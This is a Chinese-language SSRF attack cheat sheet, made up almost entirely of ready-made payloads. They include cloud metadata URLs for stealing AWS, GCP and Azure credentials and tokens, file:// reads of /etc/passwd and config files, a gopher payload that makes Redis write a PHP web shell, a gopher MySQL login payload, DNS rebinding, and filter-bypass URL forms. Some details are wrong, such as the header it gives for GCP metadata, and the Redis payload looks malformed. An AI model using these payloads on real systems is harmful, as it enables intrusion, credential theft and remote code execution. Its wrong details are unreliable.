# SSRF详细分类

## 1. 基础SSRF攻击

```python
?url=http://internal-server/
?url=file:///etc/passwd
?url=ftp://internal-server/
```

---

## 2. AWS元数据攻击

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/public-hostname
http://169.254.169.254/latest/meta-data/local-hostname
```

---

## 3. GCP元数据攻击

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

需要Header: `Metadata: true`

---

## 4. Azure元数据攻击

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute
http://169.254.169.254/metadata/instance/network
http://169.254.169.254/metadata/identity/oauth2/token
```

需要Header: `Metadata: true`

---

## 5. 协议利用

### Gopher协议

```
gopher://127.0.0.1:6379/_INFO
gopher://127.0.0.1:6379/_FLUSHALL
```

### Dict协议

```
dict://localhost:11211/stats
dict://127.0.0.1:3306/
```

### File协议

```
file:///etc/passwd
file:///var/www/html/config.php
```

### FTP协议

```
ftp://internal-server/secrets.txt
```

---

## 6. Gopher攻击Redis

```
gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0A_CONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0A_CONFIG%20SET%20dbfilename%20shell.php%0D%0A_SAVE
```

---

## 7. Gopher攻击MySQL

```
gopher://127.0.0.1:3306/_%a5%00%00%01%8f%e0%00%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00%00mysql%20_native_password%00%02_password%00%0f%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00
```

---

## 8. DNS重绑定

```
第一次解析: attacker.com -> 127.0.0.1 (白名单IP)
第二次解析: attacker.com -> 192.168.1.1 (内网IP)

使用: https://lock.cmpxchg8b.com/bind.php
```

---

## 9. 绕过技术

### IP地址变形

```
127.0.0.1
127.1
0x7f000001
2130706433 (十进制)
localhost
::1
```

### URL解析绕过

```
http://evil.com@127.0.0.1
http://127.0.0.1.evil.com
http://127。0。0。1
http://127.0.0.1.xip.io
```

### 协议跳转

```
dict://
gopher://
ftp://
```
